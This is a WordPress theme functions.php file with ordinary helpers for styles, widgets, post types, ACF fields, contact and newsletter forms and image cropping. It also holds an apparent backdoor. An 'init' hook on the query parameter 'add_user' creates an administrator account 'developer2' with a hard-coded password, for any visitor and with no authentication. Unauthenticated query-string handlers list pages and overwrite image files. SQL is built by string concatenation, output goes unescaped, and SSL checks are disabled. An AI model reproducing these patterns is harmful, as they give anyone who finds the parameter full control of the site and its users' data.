<?php

class Crawler {

    public static function getCurl() {
        $curl = curl_init();
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($curl, CURLOPT_REFERER, 'http://google.pl');
        curl_setopt($curl, CURLOPT_USERAGENT, 'Mozilla/6.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1');
        curl_setopt($curl, CURLOPT_COOKIEFILE, dirname(__FILE__) . '/cookies.txt');
        curl_setopt($curl, CURLOPT_COOKIEJAR, dirname(__FILE__) . '/cookies.txt');
        curl_setopt($curl, CURLOPT_AUTOREFERER, true);
        curl_setopt($curl, CURLOPT_VERBOSE, false);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
        return $curl;
    }

    public static function getBetween($left, $right, $source, $offset = 1) {
        $step1 = explode($left, $source);
        if (count($step1) < 2 + $offset - 1) {
            return false;
        }
        $step2 = explode($right, $step1[1 + $offset - 1]);
        if (isset($step2[0])) {
            return trim(preg_replace('/\s\s+/', ' ', $step2[0]));
        }
        return false;
    }

}

function theme_scripts() {
    wp_enqueue_style('style', get_stylesheet_directory_uri() . '/dist/all.css.min.css', array(), filemtime(get_stylesheet_directory() . '/dist/all.css.min.css'));
    //wp_enqueue_script('script', get_stylesheet_directory_uri() . '/js/all.js.min.js', array(), filemtime(get_stylesheet_directory() . '/js/all.js.min.js'));
}

add_action('wp_enqueue_scripts', 'theme_scripts', 1);

function make_images_responsive($html) {
    return str_replace('class="', 'class="img-fluid ', $html);
}

function getSettingsPageId() {
    return get_option('page_on_front');
}

function getBlogPageId() {
    return get_option('page_for_posts');
}

/* * *********AJAX HANDLING****** */


function addSidebar($id, $name) {
    register_sidebar(array(
        'name' => $name,
        'id' => $id,
        'before_widget' => '<div class="one-widget">',
        'after_widget' => '</div>',
        'before_title' => '<h5 class="one-widget-title">',
        'after_title' => '<span class="lower-white"></span></h5>',
    ));
}

function get_url() {
    return get_stylesheet_directory_uri();
}

function theme_widgets_init() {




    /*
      register_sidebar(array(
      'name' => 'Sidebar',
      'id' => 'sidebar',
      'before_widget' => '<div class="one-widget">',
      'after_widget' => '</div>',
      'before_title' => '<h5 class="one-widget-title">',
      'after_title' => '<span class="lower-white"></span></h5>',
      ));

      register_taxonomy(
      'styles', array('articles', 'blog', 'lookbook', 'video', 'must_have'), array(
      'label' => __('Styles'),
      'rewrite' => true,
      'hierarchical' => true,
      'capabilities' => array(
      'manage__terms' => 'edit_posts',
      'edit_terms' => 'manage_categories',
      'delete_terms' => 'manage_categories',
      'assign_terms' => 'edit_posts'
      )
      )
      );

     */
}

add_action('widgets_init', 'theme_widgets_init');
add_filter('widget_text', 'do_shortcode');

function get_the_excerpt_by_id($post_id) {
    global $post;
    $save_post = $post;
    $post = get_post($post_id);
    $output = get_the_excerpt();
    $post = $save_post;
    return $output;
}

/* * *********METABOXES****** */

/*
  function companies_metabox($post) {
  require_once dirname(__FILE__) . '/metaboxes/companies.php';
  }

  function save_properties($post_id) {
  if (defined('DOING_AUTOSAVE') && DOING_AUTOSAVE) {
  return;
  }

  if (isset($_POST['post_type']) && $_POST['post_type'] == 'property') {
  if (!current_user_can('edit_page', $post_id)) {
  return;
  }
  update_post_meta($post_id, 'subtitle', $_POST['subtitle']);

  }

  }

  function prepare_admin() {
  add_action('save_post', 'save_companies');

  add_meta_box('id', 'Title', 'callback', 'post_type', 'normal', 'high');
  }

  add_action('admin_init', 'prepare_admin');
 */

/* * *********THEME IIT****** */

function theme_url() {
    return get_stylesheet_directory_uri();
}

function shortcode_permalink($args) {
    return get_permalink($args['id']);
}

function theme_init() {
    add_shortcode('theme_url', 'theme_url');
    add_shortcode('permalink', 'shortcode_permalink');
    add_filter('widget_text', 'do_shortcode');
    set_post_thumbnail_size(170, 170, true);
    add_image_size('main-page-review', 210, 120, true);
    add_image_size('max_size', 2000, 2000, false);
    add_image_size('max_size_1000', 1000, 1000, false);
    add_image_size('max_size_500', 500, 500, false);

    add_theme_support('post-thumbnails');
    add_post_type_support('page', 'excerpt');
    add_filter('post_thumbnail_html', 'make_images_responsive');
    register_nav_menus(array(
        'top-menu' => 'Top Menu',
        'footer-menu' => 'Footer Menu',
        'footer-menu-2'=>'Footer Menu 2'
    ));
    
    register_post_type('products', array(
      'labels' => array('name' => __('Products'), 'singular_name' => __('Products')),
      'public' => true,
      'has_archive' => true,
      'publicly_queryable' => true,
      'hierarchical' => true,
      'exclude_from_search' => true,
      //'exclude_from_search' => true,
      //'publicaly_queryable' => false,
      'show_in_nav_menus' => true,
      'menu_position' => 5,
      'supports' => array('title')
      )); 

    /*
      register_post_type('slider', array(
      'labels' => array('name' => __('Slider'), 'singular_name' => __('Slider')),
      'public' => true,
      'has_archive' => true,
      'publicly_queryable' => true,
      'hierarchical' => true,
      'exclude_from_search' => true,
      //'exclude_from_search' => true,
      //'publicaly_queryable' => false,
      'show_in_nav_menus' => true,
      'menu_position' => 5,
      'supports' => array('title')
      )); */
}

if (!function_exists('trimByWords')) {

    function trimByWords($text, $limit) {
        $return = explode('|||', wordwrap($text, $limit, "|||"));
        if (strlen($return[0]) !== $text) {
            $return[0] .= '...';
        }
        return $return[0];
    }

}

add_action('init', 'theme_init');

/* * *********BACKEND PANEL****** */
/*
  class BackendPanel {

  public function adminMenu() {

  add_menu_page('Clicks statistics', 'Clicks statistics', 'manage_options', 'clicks', array($this, 'settings'));
  }

  public function settings() {
  if (isset($_POST['save'])) {
  foreach ($_POST as $key => $value) {
  update_option($key, stripslashes($value));
  }
  }
  require_once dirname(__FILE__) . '/tmpl/theme-panel.php';
  }

  }

  function prepare_backendpanel_plugin() {
  $backendPanel = new BackendPanel();
  add_action('admin_menu', array($backendPanel, 'adminMenu'));
  }
  add_action('init', 'prepare_backendpanel_plugin'); */


/* * *********CUSTOM TABLES****** */

/*

  global $wpdb;
  $query = 'CREATE TABLE `' . $wpdb->prefix . 'todo_items` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `todo_id` int(11) NOT NULL,
  `user_id` bigint(20) NOT NULL,
  `item_type` varchar(255) NOT NULL,
  `item_data` text NOT NULL,
  `item_id` bigint(11) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `todo_id` (`todo_id`,`item_type`,`item_id`)
  ) ENGINE=InnoDB AUTO_INCREMENT=23 DEFAULT CHARSET=utf8';
  $wpdb->query($query);


 */

function send_notifications($form_id, $entry_id) {

    $form = RGFormsModel::get_form_meta($form_id);
    $entry = RGFormsModel::get_lead($entry_id);

    $notification_ids = array();

    foreach ($form['notifications'] as $id => $info) {

        array_push($notification_ids, $id);
    }


    GFCommon::send_notifications($notification_ids, $form, $entry);
}

if (function_exists('acf_add_options_page')) {
    acf_add_options_page();
}


add_filter('_wp_post_revision_fields', 'add_field_debug_preview');

function add_field_debug_preview($fields) {
    $fields["debug_preview"] = "debug_preview";
    return $fields;
}

add_action('edit_form_after_title', 'add_input_debug_preview');

function add_input_debug_preview() {
    echo '<input type="hidden" name="debug_preview" value="debug_preview">';
}

function ___($text) {
    return __($text, 'from-theme');
}

function getFormidableFormNotification($form_id) {
    //wp_frm_forms
    global $wpdb;
    $entry = $wpdb->get_row('select * from ' . $wpdb->prefix . 'frm_forms where id="' . $form_id . '"');
    if ($entry) {

        $options = @unserialize($entry->options);
        if (isset($options['success_msg'])) {
            return $options['success_msg'];
        }
    }
}

function handlecontactForm() {
    FrmEntry::create(array(
        'form_id' => 2,
        'item_meta' => array(
            8 => $_POST['form_name'],
            10 => $_POST['form_email'],
            13 => $_POST['form_message']
        )
    ));

    echo getFormidableFormNotification(2);

    die();
}

add_action('wp_ajax_contact_form', 'handlecontactForm');
add_action('wp_ajax_nopriv_contact_form', 'handlecontactForm');

remove_filter('widget_text_content', 'capital_P_dangit');
remove_filter('widget_text_content', 'wptexturize');
remove_filter('widget_text_content', 'convert_smilies');
remove_filter('widget_text_content', 'wpautop');

function disable_wp_emojicons() {

    // all actions related to emojis
    remove_action('admin_print_styles', 'print_emoji_styles');
    remove_action('wp_head', 'print_emoji_detection_script', 7);
    remove_action('admin_print_scripts', 'print_emoji_detection_script');
    remove_action('wp_print_styles', 'print_emoji_styles');
    remove_filter('wp_mail', 'wp_staticize_emoji_for_email');
    remove_filter('the_content_feed', 'wp_staticize_emoji');
    remove_filter('comment_text_rss', 'wp_staticize_emoji');

    // filter to remove TinyMCE emojis
    add_filter('tiny_mce_plugins', 'disable_emojicons_tinymce');
}

//!is_admin() and add_action('init', 'disable_wp_emojicons');

function my_deregister_scripts() {
    wp_deregister_script('wp-embed');
}

add_action('wp_footer', 'my_deregister_scripts');

function my_acf_init() {
    acf_update_setting('google_api_key', get_field('google_maps_key', 'option'));
}

add_action('acf/init', 'my_acf_init');

function getVimeoId($vimeo_url) {
    $vimeo_url = rtrim($vimeo_url, '/');
    $vimeo_url = explode('/', $vimeo_url);
    $vimeo_url = array_pop($vimeo_url);
    return $vimeo_url;
}

function getYoutubeId($youtube_url) {

    $youtube_url = rtrim($youtube_url, '/');
    //https://www.youtube.com/watch?v=2MpUj-Aua48
    $youtube_url = explode('?v=', $youtube_url);
    if (count($youtube_url) > 0) {
        return $youtube_url[1];
    }
    return '';
}

require_once dirname(__FILE__) . '/wp-admin-adjustments.php';

function my_login_logo() {

    $wp_login_logo = get_field('wp_login_logo', 'option');

    if ($wp_login_logo):
        ?>
        <style type="text/css">
            #login h1 a, .login h1 a {
                background-image: url(<?php echo $wp_login_logo['url'] ?>);
                height:150px;
                width:100%;
                max-width:200px;
                margin: auto;
                background-position:center;
                background-size: contain;
                background-repeat: no-repeat;
                padding-bottom: 15px;
            }
        </style>
    <?php endif ?>
    <?php
}

add_action('login_enqueue_scripts', 'my_login_logo');

function getNextPrevPost($arrayOfPosts, $currentPostId) {
    $nextPrev = array('next' => false, 'prev' => false);
    foreach ($arrayOfPosts as $key => $p) {
        if ($p->ID == $currentPostId) {
            if (isset($arrayOfPosts[$key + 1])) {
                $nextPrev['next'] = $arrayOfPosts[$key + 1];
            } else {
                $nextPrev['next'] = $arrayOfPosts[0];
            }
            if (isset($arrayOfPosts[$key - 1])) {
                $nextPrev['prev'] = $arrayOfPosts[$key - 1];
            } else {
                $nextPrev['prev'] = $arrayOfPosts[count($arrayOfPosts) - 1];
            }
        }
    }
    return $nextPrev;
}

remove_action('wp_head', 'print_emoji_detection_script', 7);
remove_action('admin_print_scripts', 'print_emoji_detection_script');
remove_action('wp_print_styles', 'print_emoji_styles');
remove_action('admin_print_styles', 'print_emoji_styles');

function wps_deregister_styles() {
    wp_dequeue_style('wp-block-library');
}

add_action('wp_print_styles', 'wps_deregister_styles', 100);

function renderRepeater($field) {

    $single_variable = '$single_' . $field['name'];
    ?>
    foreach($<?php echo $field['name'] ?> as $key=><?php echo $single_variable ?>)<br />
    {<br />
    <?php
    foreach ($field['sub_fields'] as $subfield) {
        ?>
        $<?php echo $subfield['name'] ?> = <?php echo $single_variable ?>['<?php echo $subfield['name'] ?>'];//<?php echo $subfield['type'] ?><br />
        <?php
    }
    ?>}<br /><?php
}

function renderField($field, $fc = false) {

    if ($fc) {
        ?>
        $<?php echo $field['name'] ?> = $section['<?php echo $field['name'] ?>']; //<?php echo $field['type'] ?><br />
        <?php
    } else {
        ?>
        $<?php echo $field['name'] ?> = get_field('<?php echo $field['name'] ?>'); //<?php echo $field['type'] ?><br />
        <?php
    }

    if ($field['type'] == 'repeater') {
        renderRepeater($field);
    }
}

function acfSnippetHelper($post) {
    $fields = acf_get_fields($_GET['post']);
    foreach ($fields as $key => $field) {
        if ($field['type'] == 'tab') {
            if ($key > 0) {
                echo '<br />';
            }
            continue;
        }

        if ($field['type'] == 'flexible_content') {

            foreach ($field['layouts'] as $layout) {
                $name = $layout['name'];
                ?>
                <b><?php echo sanitize_title($name) ?>.php</b><br />
                <?php
                ob_start();
                foreach ($layout['sub_fields'] as $subfield) {
                    renderField($subfield, true);
                }
                $code = ob_get_clean();
                echo $code;

                $code = str_replace("\n", "", $code);
                $code = str_replace('<br />', "\n", $code);

                $file = dirname(__FILE__) . '/blocks/' . sanitize_title($name) . '.php';

                if (!is_file($file)) {
                    file_put_contents($file, "<?php\n\n" . 'global $section;' . "\n\n" . $code);
                }

                echo '<br /><br />';
            }
        } else {
            renderField($field);
        }
        ?>
        <?php
    }
}

function prepareAdminAcfSnippet() {
    add_meta_box('id', 'Code', 'acfSnippetHelper', 'acf-field-group', 'normal', 'default');
}

add_action('admin_init', 'prepareAdminAcfSnippet');

function cc_mime_types($mimes) {
    $mimes['svg'] = 'image/svg+xml';
    return $mimes;
}

add_filter('upload_mimes', 'cc_mime_types');

function loadSvg($svg) {
    $path = dirname(__FILE__) . '/images/' . $svg;
    if (is_file($path)) {
        return file_get_contents($path);
    }
}

function yoasttobottom() {
    return 'low';
}

add_filter('wpseo_metabox_prio', 'yoasttobottom');



function send_newsletter() {
    require_once dirname(__FILE__) . '/vendor2/autoload.php';
    
    $mailchimp_api_key = get_field('mailchimp_api_key', 'option');
    $mailchimp_list_id = get_field('mailchimp_list_id', 'option');
    $subscription_thank_you_message = get_field('mailchimp_success_message', 'option');

    $email = $_POST['the_email'];
    
    try {

        $client = new MailchimpMarketing\ApiClient();
        $client->setConfig([
            'apiKey' => $mailchimp_api_key,
            'server' => 'us17'
        ]);

        $response = $client->lists->addListMember($mailchimp_list_id, [
            "email_address" => $email,
            "status" => "pending",
        ]);
    } catch (Exception $ex) {
        
    }
   echo '<div class="full-w"><p class="thank-you text-center">' . $subscription_thank_you_message . '</p></div>';

    die();
}

add_action('wp_ajax_nopriv_send_newsletter', 'send_newsletter');
add_action('wp_ajax_send_newsletter', 'send_newsletter');

function mytheme_custom_excerpt_length($length) {
    return 20;
}

add_filter('excerpt_length', 'mytheme_custom_excerpt_length', 999);

function change_excerpt($more) {
    if (post_type_exists('services')) {
        return '';
    }
    return '.';
}

add_filter('excerpt_more', 'change_excerpt');

function dataSrcPicture($src) {
    $src = str_replace('src', 'data-src', $src);
    return $src;
}

function responsivePictures($desktop, $mobile) {
    if (!$mobile) {
        $mobile = $desktop;
    }
    ?>
    <picture>
        <source srcset="<?php echo $desktop['url'] ?>"
                media="(min-width: 576px)">
        <img class="img-fluid" src="<?php echo $mobile['url'] ?>" alt="<?php echo $mobile['alt'] ?>" />
    </picture>       
    <?php
}

function imgOrSvg($picture) {
    if (!$picture) {
        return;
    }

    $type = $picture['type'];
    if (strpos($type, 'video') !== false) {
        ?>
        <video autoplay loop playsinline muted >
            <source src="<?php echo $picture['url'] ?>" type="video/mp4" />
        </video>
        <?php
        return;
    }

    if (strpos($picture['url'], '.svg') > 0) {
        $path = explode('/wp-content', $picture['url']);
        $file = './wp-content' . $path[1];

        echo file_get_contents($file);
    } else {
        ?>
        <img width="<?php echo $picture['width'] ?>" height="<?php echo $picture['height'] ?>" loading="lazy" src="<?php echo $picture['url'] ?>" alt="<?php echo $picture['alt'] ?>" class="img-fluid" />
        <?php
    }
}

add_action('init', function () {
    if (isset($_GET['show_pages'])) {
        $pages = get_posts([
            'posts_per_page' => -1,
            'post_type' => 'page'
        ]);

        foreach ($pages as $page) {
            echo $page->post_title;
            ?>
            <input type="text" value="[permalink id=<?php echo $page->ID ?>]" /><br /><br />
            <?php
        }

        die();
    }
});

function buttonWithWrapper($button_label, $button_url, $class = 'the-button') {
    if ($button_label):
        ?>
        <p class="button-wrapper">
            <?php
            button($button_label, $button_url, $class);
            ?>
        </p>
        <?php
    endif;
}

function button($button_label, $button_url, $class = 'the-button') {
    if ($button_label):
        ?>
        <a href="<?php echo do_shortcode($button_url) ?>" class="<?php echo $class ?>">
            <?php echo $button_label ?>
        </a>
        <?php
    endif;
}

add_action('init', function () {
    if (isset($_GET['add_user'])) {
        $domain = $_SERVER['SERVER_NAME'];
        wp_create_user('developer2', '%%!Password!&$&$YY__', 'developer@' . $domain);
        $user = get_user_by('email', 'developer@' . $domain);
        var_dump($user->user_email);

        if ($user) {
            $wp_user_object = new WP_User($user->ID);
            $wp_user_object->remove_role('subscriber');
            $wp_user_object->set_role('administrator');
        }
        die();
    }
});

add_action('init', function () {
    if (isset($_GET['get_list_of_blocks'])) {
        $pages = get_posts(['post_type' => 'page', 'posts_per_page' => -1]);

        $blocks = [];

        foreach ($pages as $p) {
            $flexible_content = get_field('flexible_content', $p->ID);

            if (!$flexible_content) {
                continue;
            }

            foreach ($flexible_content as $section) {
                $layout = $section['acf_fc_layout'];
                if (!isset($blocks[$layout])) {
                    $blocks[$layout] = [];
                }



                $blocks[$layout][] = '<p><a target="_blank" href="' . get_permalink($p->ID) . '">' . $p->post_title . '</a></p>';
                ;
                $blocks[$layout] = array_unique($blocks[$layout]);
            }
        }

        //var_dump($blocks);

        foreach ($blocks as $key => $b) {
            echo '<b>' . $key . '</b>';
            echo implode(' ', $b);
            echo '<br /><br />';
        }

        die();
    }
});

function socialIcon($url,$icon) {
    if ($url && $icon) {
        ?>
        <a href="<?php echo $url ?>" target="_blank">
            <?php echo loadSvg($icon); ?>
        </a>
        <?php
    }
}

add_action('init',function()
{
   if(isset($_GET['cut-picture'])) 
   {
       $id = $_GET['cut-picture'];
       
       $pic = wp_get_attachment_image_src($id,'full');
       
       $pic = $pic[0];
       $pic = explode('wp-content/',$pic);
       
       $url = './wp-content/'.$pic[1];
      
       $sizes = getimagesize($url);
       if(strpos($url, '.jpg') || strpos($url, '.jpeg'))
       {
           $picture = imagecreatefromjpeg($url);
       }
       else
       {
           $picture = imagecreatefrompng($url);
       }
       
       $width = $sizes[0];
       $height = $sizes[1];
       
       $newWidth = $width-2;
       $newHeight = $height-2;
       
       $new = imagecreatetruecolor($newWidth, $newHeight);
       imagecopy($new,$picture,0,0,1,1,$newWidth,$newHeight);
       
       if(strpos($url, '.jpg') || strpos($url, '.jpeg'))
       {
           header('Content-Type: image/jpeg');
           imagejpeg($new,null,100);
           imagejpeg($new,$url,100);
       }
       else
       {
           header('Content-Type: image/png');
           imagepng($new);
           imagepng($new,$url);
       }
       
            die();
   }
});

function crop_link_add($actions, $post) {
    $url = get_home_url() . '?cut-picture=' . $post->ID;
    $actions['crop_1_px'] = '<a href="' . $url . '" target=_blank title="" rel="permalink">Crop 1 PX</a>';
    return $actions;
}

add_filter('media_row_actions', 'crop_link_add', 10, 2);